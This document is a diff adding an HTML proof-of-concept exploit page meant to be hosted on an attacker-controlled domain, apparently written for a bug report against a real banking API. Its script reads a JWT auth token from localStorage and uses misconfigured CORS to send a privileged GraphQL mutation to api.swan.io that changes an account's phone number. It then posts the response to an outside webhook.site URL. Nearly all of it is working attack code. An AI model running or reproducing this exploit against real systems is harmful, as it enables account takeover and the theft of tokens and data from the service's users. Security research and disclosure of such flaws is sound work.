@@ -1,0 +1,29 @@
+<!-- HOST THIS ON attacker-controlled snowgoose.info -->
+<script>
+const WEBHOOK='https://webhook.site/9ef1fe5e-6b72-4a68-b1bd-5ca39d09311a';
+
+(async () => {
+  /* 1️⃣  steal JWT from dashboard localStorage via injected JS
+         (requires XSS or sub-domain takeover) */
+  const jwt = localStorage.getItem('authToken');   // or whatever key holds it
+  if (!jwt) { alert('JWT not found – exploit stops here'); return; }
+
+  /* 2️⃣  use mis-configured CORS to run privileged mutation */
+  const q = `
+    mutation { startPhoneNumberModification(input:{
+      oldPhoneNumber:"+33600000001", newPhoneNumber:"+33699999999"
+    }){ __typename }}`;
+  const res = await fetch('https://api.swan.io/admin-auth/graphql', {
+       method:'POST',
+       credentials:'omit',                    // we rely on the header, not cookies
+       headers:{ 'Content-Type':'application/json',
+                 'X-Swan-Authenticator-Token': jwt,
+                 'Origin':location.origin },  // reflected by the API
+       body: JSON.stringify({query:q})
+  }).then(r=>r.text());
+
+  /* 3️⃣  exfiltrate raw response to prove success */
+  fetch(WEBHOOK, {method:'POST',body:res});
+  console.log('GraphQL response:', res);
+})();
+</script>
